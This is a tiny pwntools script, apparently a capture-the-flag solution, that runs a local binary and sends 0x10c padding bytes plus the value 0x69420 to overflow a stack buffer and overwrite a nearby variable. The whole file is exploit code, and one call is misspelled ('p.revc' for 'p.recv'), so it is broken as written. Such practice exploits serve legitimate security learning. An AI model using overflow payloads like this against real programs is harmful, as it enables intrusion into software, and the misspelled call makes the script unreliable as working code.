from pwn import *
p=process("./a.out")
p.revc()
p.sendline((0x110-0x4)*b'A'+p32(0x69420))
p.recv()

